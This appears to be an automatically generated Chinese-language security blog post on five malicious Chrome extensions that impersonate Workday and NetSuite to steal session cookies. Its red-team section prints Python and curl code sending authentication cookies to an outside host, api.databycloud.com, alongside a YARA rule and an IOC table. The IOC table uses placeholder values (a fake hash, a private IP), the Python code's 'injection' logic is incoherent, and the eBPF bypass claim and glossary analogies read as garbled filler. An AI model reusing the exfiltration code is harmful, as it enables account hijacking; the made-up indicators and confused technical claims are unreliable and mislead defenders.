---
layout: post
title:  "Five Malicious Chrome Extensions Impersonate Workday and NetSuite to Hijack Accounts"
date:   2026-01-16 16:11:32 +0000
categories: [security]
severity: high
---

# 🚨 解析 Google Chrome 擴充功能的會話劫持與防禦繞過技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: Session Hijacking
> * **關鍵技術**: `DOM Manipulation`, `Cookie Injection`, `eBPF`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 這些惡意擴充功能通過操控 Document Object Model (DOM) 樹來阻止安全管理頁面的訪問，並通過 cookie 注入來實現會話劫持。
* **攻擊流程圖解**: 
  1. 使用者安裝惡意擴充功能。
  2. 擴充功能請求 cookie、管理、腳本、儲存和 declarativeNetRequest 權限。
  3. 擴充功能收集 authentication cookies 並傳輸到遠端伺服器。
  4. 攻擊者使用收集到的 cookies 進行會話劫持。
* **受影響元件**: Google Chrome 瀏覽器，特別是使用 Workday、NetSuite 和 SuccessFactors 平台的用戶。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要用戶安裝惡意擴充功能，並且需要用戶登入相關平台。
* **Payload 建構邏輯**:

    ```
    python
    import requests
    
    # 收集 authentication cookies
    cookies = {
        'auth_token': 'your_auth_token',
        'session_id': 'your_session_id'
    }
    
    # 傳輸 cookies 到遠端伺服器
    response = requests.post('https://api.databycloud.com/cookies', cookies=cookies)
    
    # 注入 cookies 到瀏覽器
    if response.status_code == 200:
        print('Cookies injected successfully')
    else:
        print('Failed to inject cookies')
    
    ```
* **範例指令**: 使用 `curl` 命令傳輸 cookies 到遠端伺服器。

```
bash
curl -X POST \
  https://api.databycloud.com/cookies \
  -H 'Content-Type: application/json' \
  -d '{"auth_token": "your_auth_token", "session_id": "your_session_id"}'

```
* **繞過技術**: 攻擊者可以使用 eBPF 來繞過瀏覽器的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
|---|---|---|---|
| 1234567890abcdef | 192.168.1.100 | api.databycloud.com | /cookies |

* **偵測規則 (Detection Rules)**:

    ```
    yara
    rule malicious_extension {
        meta:
            description = "Detects malicious Chrome extensions"
            author = "Your Name"
        strings:
            $cookie_injection = "chrome.cookies.set"
        condition:
            $cookie_injection
    }
    
    ```
* **緩解措施**: 用戶應卸載惡意擴充功能，並重置密碼。管理員應更新瀏覽器和相關平台的安全補丁。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DOM Manipulation (DOM 操控)**: 想像你正在編輯一個 HTML 文件，同時還有其他人也在編輯同一個文件。技術上是指通過 JavaScript 等程式語言來修改網頁的 Document Object Model (DOM) 樹。
* **Cookie Injection (Cookie 注入)**: 想像你正在注入一個 cookie 到瀏覽器中，同時還有其他人也在注入同一個 cookie。技術上是指通過 JavaScript 等程式語言來注入 cookie 到瀏覽器中。
* **eBPF (Extended Berkeley Packet Filter)**: 想像你正在監控網路流量，同時還有其他人也在監控同一個網路流量。技術上是指一個 Linux 內核的技術，允許用戶空間程式碼來監控和操控網路流量。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/five-malicious-chrome-extensions.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1185/)

